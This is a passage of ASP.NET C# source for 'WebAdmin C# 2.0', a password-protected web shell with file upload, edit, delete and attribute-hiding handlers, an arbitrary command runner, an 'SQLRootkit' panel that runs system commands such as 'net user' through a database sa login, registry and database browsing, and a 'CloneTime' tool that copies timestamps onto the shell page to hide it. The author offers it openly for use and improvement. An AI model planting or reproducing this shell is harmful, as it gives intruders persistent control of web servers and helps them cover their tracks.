    protected void btn_FileDirDel_Click(object sender, EventArgs e)
    {
        if (Request["src"] != null && Request["src"] != "")
        {
            DelDirFile(Request["src"]);
        }
    }
    protected void btn_FileDirRen_Click(object sender, EventArgs e)
    {
        string strPath = (Request["src"] != null) ? Request["src"].ToString() : "";
        if (strPath != "" && txB_FileDirRen.Text != "")
        {
            try
            {
                if (strPath[strPath.Length - 1] != '\\')
                {
                    File.Move(strPath, Directory.GetParent(strPath) + "\\" + txB_FileDirRen.Text);
                }
                else
                {
                    Directory.Move(strPath.Substring(0, strPath.Length - 1), Directory.GetParent(strPath.Substring(0, strPath.Length - 1)) + "\\" + txB_FileDirRen.Text);
                }
                Response.Write("<script type='text/javascript'>alert('Rename Success! Please refresh')</"+"script>");
                Response.Write("<script type='text/javascript'>window.open('', '_self');window.close()</"+"script>");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }
    }
    protected void btn_SetAtt_Click(object sender, EventArgs e)
    {
        try
        {
            string strPath = Request["Src"].ToString();
            if (chkB_OnlyRead.Checked == true)
            {
                File.SetAttributes(strPath, File.GetAttributes(strPath) | FileAttributes.ReadOnly);
            }
            else
            {
                if ((File.GetAttributes(strPath) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                {
                    File.SetAttributes(strPath, File.GetAttributes(strPath) ^ FileAttributes.ReadOnly);
                }
            }
            if (chkB_Hide.Checked == true)
            {
                File.SetAttributes(strPath, File.GetAttributes(strPath) | FileAttributes.Hidden);
            }
            else
            {
                if ((File.GetAttributes(strPath) & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    File.SetAttributes(strPath, File.GetAttributes(strPath) ^ FileAttributes.Hidden);
                }
            }
            if (chkB_Sys.Checked == true)
            {
                File.SetAttributes(strPath, File.GetAttributes(strPath) | FileAttributes.System);
            }
            else
            {
                if ((File.GetAttributes(strPath) & FileAttributes.System) == FileAttributes.System)
                {
                    File.SetAttributes(strPath, File.GetAttributes(strPath) ^ FileAttributes.System);
                }
            }
            if (chkB_Archive.Checked == true)
            {
                File.SetAttributes(strPath, File.GetAttributes(strPath) | FileAttributes.Archive);
            }
            else
            {
                if ((File.GetAttributes(strPath) & FileAttributes.Archive) == FileAttributes.Archive)
                {
                    File.SetAttributes(strPath, File.GetAttributes(strPath) ^ FileAttributes.Archive);
                }
            }
            Response.Write("<script type='text/javascript'>alert('Set attributes Success! Please refresh')</"+"script>");
            Response.Write("<script type='text/javascript'>window.open('', '_self');window.close()</"+"script>");
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }
    protected void gView_DB_PageIndexChanging(object sender, GridViewPageEventArgs e)
    {
        gView_DB.PageIndex = e.NewPageIndex;
        gView_DB.DataSource = myDataSet.Tables["tb_Temp"].DefaultView;
        gView_DB.DataBind();
    }
    protected void gView_DB_Sorting(object sender, GridViewSortEventArgs e)
    {
        myDataSet.Tables["tb_Temp"].DefaultView.Sort = e.SortExpression;
        gView_DB.DataSource = myDataSet.Tables["tb_Temp"].DefaultView;
        gView_DB.DataBind();
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>WebAdmin C# 2.0</title>
    <style type="text/css">
        BODY {color: #0000FF; font-family: Verdana}
        TD {color: #0000FF; font-family: Verdana}
        TH {color: #0000FF; font-family: Verdana}
        BODY {font-size: 14px; background-color: #FFFFFF}
        A:link {color: #0000FF; text-decoration: none}
        A:visited {color: #0000FF; text-decoration: none}
        A:hover {color: #FF0000; text-decoration: none}
        A:active {color: #FF0000; text-decoration: none}
        .btns {border-right: #084B8E 1px solid; border-top: #084B8E 1px solid; border-left: #084B8E 1px solid; color: #FFFFFF; border-bottom: #084B8E 1px solid; background-color: #719BC5}
        .TextBox {border-right: #084B8E 1px solid; border-top: #084B8E 1px solid; border-left: #084B8E 1px solid; border-bottom: #084B8E 1px solid}
    </style>
</head>
<body>
    <form id="form1" runat="server" enctype="multipart/form-data">
        <asp:Label ID="lbl_Tip" runat="server" EnableViewState="false"></asp:Label>
        <br />
        <br />
        <asp:Panel ID="pnl_Login" runat="server" Wrap="false" ToolTip="Login">
            <asp:Label ID="lbl_Password" runat="server" EnableViewState="false">Password:</asp:Label>
            <asp:TextBox ID="txB_Password" CssClass="TextBox" runat="server" Wrap="false" TextMode="Password"></asp:TextBox>
            <asp:Button ID="btn_Login" CssClass="btns" OnClick="btn_Login_Click" runat="server" ToolTip="Click here to login" Text="Login"></asp:Button>
        </asp:Panel>
        <asp:Panel ID="pnl_MainBar" runat="server" Wrap="false" ToolTip="Main functions-navigating bar" Visible="false">
            <asp:Label ID="lbl_Fuctions" runat="server" EnableViewState="false">Function:</asp:Label>
            <asp:Button ID="btn_FileManager" CssClass="btns" OnClick="btn_FileManager_Click" runat="server" Text="File" Width="80px"></asp:Button>
            <asp:Button ID="btn_Cmd" CssClass="btns" OnClick="btn_Cmd_Click" runat="server" Text="Command" Width="80px"></asp:Button>
            <asp:Button ID="btn_CloneTime" CssClass="btns" OnClick="btn_CloneTime_Click" runat="server" Text="CloneTime" Width="80px"></asp:Button>
            <asp:Button ID="btn_SQLRootkit" CssClass="btns" OnClick="btn_SQLRootkit_Click" runat="server" Text="SQLRootkit" Width="80px"></asp:Button>
            <asp:Button ID="btn_SysInfo" CssClass="btns" OnClick="btn_SysInfo_Click" runat="server" Text=" SysInfo " Width="80px"></asp:Button>
            <asp:Button ID="btn_DBA" CssClass="btns" OnClick="btn_DBA_Click" runat="server" Text="Database" Width="80px"></asp:Button>
            <asp:Button ID="btn_Regedit" CssClass="btns" OnClick="btn_Regedit_Click" runat="server" Text="Regedit" Width="80px"></asp:Button>
            <asp:Button ID="btn_About" CssClass="btns" OnClick="btn_About_Click" runat="server" Text="About" Width="80px"></asp:Button>
            <asp:Button ID="btn_Exit" CssClass="btns" OnClick="btn_Exit_Click" runat="server" Text="Exit" Width="80px"></asp:Button>
            <hr />
        </asp:Panel>
        <asp:Panel ID="pnl_FileManager" runat="server" Wrap="false" Width="100%">
            <asp:Label ID="lbl_Drives" runat="server" EnableViewState="false"></asp:Label>
            <br />
            <asp:Label ID="lbl_Dir" runat="server" EnableViewState="false">Currently Dir:</asp:Label>
            <asp:TextBox ID="txB_CurrentDir" CssClass="TextBox" runat="server" Wrap="false" Width="300px"></asp:TextBox>
            <asp:Button ID="btn_ListDir" CssClass="btns" OnClick="btn_ListDir_Click" runat="server" ToolTip="Go to the dir" Text=" Go "></asp:Button>
            <asp:Button ID="btn_Plaste" OnClick="btn_Plaste_Click" runat="server" Text="Plaste" CssClass="btns"></asp:Button>
            <br />
            <asp:Label ID="lbl_Operate" runat="server" EnableViewState="false">Operate:</asp:Label>
            <asp:TextBox ID="txB_NewCreate" CssClass="TextBox" runat="server" Wrap="false" Width="100px"></asp:TextBox>
            <asp:Button ID="btn_NewFile" CssClass="btns" OnClick="btn_NewFile_Click" runat="server" Text="NewFile"></asp:Button>
            <asp:Button ID="btn_NewDir" CssClass="btns" OnClick="btn_NewDir_Click" runat="server" Text="NewDir"></asp:Button>
            <input id="input_FilePath" class="TextBox" type="file" runat="server" />
            <asp:Button ID="btn_UpFile" CssClass="btns" OnClick="btn_UpFile_Click" runat="server" Text="UpLoad" EnableViewState="false"></asp:Button>
            &#09;
            <br />
            <asp:Label ID="lbl_Files" runat="server" EnableViewState="false" Font-Size="XX-Small" width="800px"></asp:Label>
        </asp:Panel>
        <asp:Panel ID="pnl_Cmd" runat="server" Wrap="false" ToolTip="CMD" Visible="false" Width="380px">
            <asp:Label ID="lbl_CmdPath" runat="server" EnableViewState="false" width="100px">Program:</asp:Label>
            <asp:TextBox ID="txB_CmdPath" CssClass="TextBox" runat="server" Wrap="false" Width="250px"></asp:TextBox>
            <br />
            <asp:Label ID="lbl_CmdArgs" runat="server" EnableViewState="false" width="100px">Arguments:</asp:Label>
            <asp:TextBox ID="txB_CmdArgs" CssClass="TextBox" runat="server" Wrap="false" Width="250px">/c ver</asp:TextBox>
            <asp:Button ID="btn_CmdRun" CssClass="btns" OnClick="btn_CmdRun_Click" runat="server" Text="Run" EnableViewState="false"></asp:Button>
            <br />
            <asp:Label ID="lbl_CmdResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel ID="pnl_CloneTime" runat="server" Wrap="false" ToolTip="Clone Time" Visible="false">
            <asp:Label ID="lbl_Rework" runat="server">ReTime File or Dir:</asp:Label>
            <asp:TextBox ID="txB_File1Time" CssClass="TextBox" runat="server" Wrap="false" Width="400px">thispage.aspx</asp:TextBox>
            <br />
            <asp:Label ID="lbl_Copied" runat="server">Source File or Dir:</asp:Label>
            <asp:TextBox ID="txB_File2Time" CssClass="TextBox" runat="server" Wrap="false" Width="400px">C:\Inetpub\wwwroot\web.gif</asp:TextBox>
            <br />
            <asp:Button ID="btn_CloneT" CssClass="btns" OnClick="btn_CloneT_Click" runat="server" Text="Clone" ToolTip="Clone the properity of C/W/A time from file2 to file1"></asp:Button>
            <br />
            <asp:Label ID="lbl_CloneResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel ID="pnl_SQLRootkit" runat="server" Wrap="false" ToolTip="SQLRootKit" Visible="false">
            <asp:Label ID="lbl_Conn" runat="server" width="100px">ConnString:</asp:Label>
            <asp:TextBox ID="txB_ConnStr" CssClass="TextBox" runat="server" Wrap="false" Width="500px">Data Source=127.0.0.1;Initial Catalog=;User ID=sa;Password=;</asp:TextBox>
            <br />
            <asp:Label ID="lbl_Sqlcmd" runat="server" width="100px">Command:</asp:Label>
            <asp:TextBox ID="txB_SQLCmd" CssClass="TextBox" runat="server" Wrap="false" Width="500px">net user</asp:TextBox>
            <asp:Button ID="btn_SQLCmdRun" CssClass="btns" OnClick="btn_SQLCmdRun_Click" runat="server" Text="Run"></asp:Button>
            <br />
            <asp:Label ID="lbl_SQLResult" runat="server" ForeColor="Blue"></asp:Label>
        </asp:Panel>
        <asp:Panel ID="pnl_SysInfo" runat="server" Wrap="false" ToolTip="System Infomation" Visible="false" EnableViewState="false">
            <table width="80%" border="1" style="margin: 0 auto">
                <tbody>
                    <tr>
                        <td colspan="2">Web Server Information</td>
                    </tr>
                    <tr>
                        <td style="width: 40%">Server IP</td>
                        <td style="width: 60%"><asp:Label ID="lbl_ServerIP" runat="server" EnableViewState="false"></asp:Label></td>
                    </tr>
                    <tr>
                        <td style="height: 73">Machine Name</td>
                        <td><asp:Label ID="lbl_MachineName" runat="server" EnableViewState="false"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>Network Name</td>
                        <td><asp:Label ID="lbl_NetworkName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>User Name in this Process</td>
                        <td><asp:Label ID="lbl_UserName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>OS Version</td>
                        <td><asp:Label ID="lbl_OSver" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>Started Time</td>
                        <td><asp:Label ID="lbl_StartTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>System Time</td>
                        <td><asp:Label ID="lbl_SysTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>IIS Version</td>
                        <td><asp:Label ID="lbl_IISVer" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>HTTPS</td>
                        <td><asp:Label ID="lbl_HTTPS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>PATH_INFO</td>
                        <td><asp:Label ID="lbl_RelPath" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>PATH_TRANSLATED</td>
                        <td><asp:Label ID="lbl_AbsPath" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>SERVER_PORT</td>
                        <td><asp:Label ID="lbl_SerPort" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>SeesionID</td>
                        <td><asp:Label ID="lbl_SID" runat="server"></asp:Label></td>
                    </tr>
                </tbody>
            </table>
        </asp:Panel>
        <asp:Panel ID="pnl_DBA" runat="server" Wrap="false" ToolTip="Manage Database" Visible="false">
            <asp:Label ID="lbl_DBConn" runat="server" width="120px">ConnString :</asp:Label>
            <asp:TextBox ID="txB_DBConnStr" CssClass="TextBox" runat="server" Wrap="false" Width="500px">Provider=SQLOLEDB;Data Source=(local);Initial Catalog=master;User Id=sa;Password=***</asp:TextBox>
            <br />
            <asp:Label ID="lbl_DBType" runat="server" width="120px">Database Type:</asp:Label>
            <asp:RadioButton ID="rbtn_TypeSQL" runat="server" Text="MSSQL" Width="80px" CssClass="btns" OnCheckedChanged="rbtn_SQL_Y" GroupName="DBType" AutoPostBack="true" Checked="true"></asp:RadioButton>
            <asp:RadioButton ID="rbtn_TypeAcc" runat="server" Text="Access" Width="80px" CssClass="btns" OnCheckedChanged="rbtn_Acc_Y" GroupName="DBType" AutoPostBack="true"></asp:RadioButton>
            <asp:Button ID="btn_DBSubmit" CssClass="btns" OnClick="btn_DBSubmit_Click" runat="server" Text="Submit" Width="80px"></asp:Button>
            <br />
            <asp:Label ID="lbl_DBShowTable" runat="server"></asp:Label>
            <br />
            <asp:Label ID="lbl_DBExec" runat="server" height="37px" visible="false">Execute SQL :</asp:Label>
            <asp:TextBox ID="txB_DBExecStr" runat="server" TextMode="MultiLine" Visible="false" Width="500" CssClass="TextBox" Height="50px"></asp:TextBox>
            <asp:Button ID="btn_DBExec" OnClick="btn_DBExec_Click" runat="server" Text="Exec" Visible="false" CssClass="btns"></asp:Button>
            <br />
            <asp:Label ID="lbl_DBExecRes" runat="server"></asp:Label>&nbsp;<br />
            <asp:GridView ID="gView_DB" runat="server" CellPadding="4" ForeColor="#333333" AllowPaging="True" PageSize="20" OnPageIndexChanging="gView_DB_PageIndexChanging" AllowSorting="True" OnSorting="gView_DB_Sorting" GridLines="None">
                <RowStyle BackColor="#EFF3FB" />
                <FooterStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
                <PagerStyle BackColor="#2461BF" ForeColor="White" HorizontalAlign="Center" />
                <SelectedRowStyle BackColor="#D1DDF1" Font-Bold="True" ForeColor="#333333" />
                <HeaderStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
                <AlternatingRowStyle BackColor="White" />
                <EditRowStyle BackColor="#2461BF" />
            </asp:GridView>            
        </asp:Panel>
        <asp:Panel ID="pnl_Regedit" runat="server" Wrap="false" ToolTip="Read Regedit" Visible="false" Width="785px">
            <asp:Label ID="lbl_RegKey" runat="server" width="114px">Key\objName :</asp:Label>
            <asp:TextBox ID="txB_RegKey" CssClass="TextBox" runat="server" Wrap="false" Width="651px">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName</asp:TextBox>
            <br />
            <asp:Label ID="lbl_RegValue" runat="server" width="114px">Value:</asp:Label>
            <asp:TextBox ID="txB_RegValue" CssClass="TextBox" runat="server" Wrap="false" Width="317px"></asp:TextBox>
            <asp:Button ID="btn_ReadReg" CssClass="btns" OnClick="btn_ReadReg_Click" runat="server" Text="Read"></asp:Button>
        </asp:Panel>
        <asp:Panel ID="pnl_About" runat="server" Wrap="false" ToolTip="about WebAdmin C# 2.0" Visible="false" Width="789px" Height="25px">
            <br />
            <br />
            <asp:Label ID="lbl_About" runat="server" width="80px">The simple WebAdmin Page was written, or refitted, by sageking2. Most grateful to those who will use or improve it!&nbsp;</asp:Label>
            <br />
            <br />
            <center><asp:HyperLink ID="hyperLink_About" runat="server" Visible="true" Target="_blank" NavigateUrl="http://hi.baidu.com/sageking2/blog/item/33b6b234eb87b245241f1427.html">Error Feedback</asp:HyperLink></center>&nbsp;<br />
        </asp:Panel>
        <asp:Panel ID="pnl_FileEdit" runat="server" Wrap="false" ToolTip="Edit File" Visible="false" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:Label ID="lbl_FileEdit" runat="server">File Path : </asp:Label>
            <asp:TextBox ID="txB_FileEdit" runat="server" Width="300" CssClass="TextBox" ReadOnly="true"></asp:TextBox>
            * 
            <br />
            <asp:TextBox ID="txB_FileContent" runat="server" TextMode="MultiLine" CssClass="TextBox" Columns="100" Rows="25"></asp:TextBox>
            <br />
            <asp:Button ID="btn_FileEdit" OnClick="btn_FileEdit_Click" runat="server" Text="Sumbit" CssClass="btns"></asp:Button>
        </asp:Panel>
        <asp:Panel ID="pnl_FileDirDel" runat="server" Wrap="false" ToolTip="Delete File/Folder" Visible="false" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:Label ID="lbl_FileDirDel" runat="server"></asp:Label>
            <br />
            <asp:Button ID="btn_FileDirDel" OnClick="btn_FileDirDel_Click" runat="server" Text="Delete It" CssClass="btns"></asp:Button>
        </asp:Panel>
        <asp:Panel ID="pnl_FileDirRename" runat="server" Wrap="false" ToolTip="Rename File/Folder" Visible="false" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:TextBox ID="txB_FileDirRen" CssClass="TextBox" runat="server" Wrap="false" Width="200px"></asp:TextBox>
            <asp:Button ID="btn_FileDirRen" OnClick="btn_FileDirRen_Click" runat="server" Text="Rename It" CssClass="btns"></asp:Button>
        </asp:Panel>
        <asp:Panel ID="pnl_FileDirAtt" runat="server" Wrap="false" Visible="false" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:CheckBox ID="chkB_OnlyRead" CssClass="TextBox" Text="ReadOnly" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox ID="chkB_Hide" CssClass="TextBox" Text="hide" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox ID="chkB_Sys" CssClass="TextBox" Text="sys" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox ID="chkB_Archive" CssClass="TextBox" Text="archive" Width="100px" Runat="server" ></asp:CheckBox>
            <br />
            <asp:Button ID="btn_SetAtt" OnClick="btn_SetAtt_Click" runat="server" Text="Set It" CssClass="btns"></asp:Button>
        </asp:Panel>        
    </form>
</body>
</html>
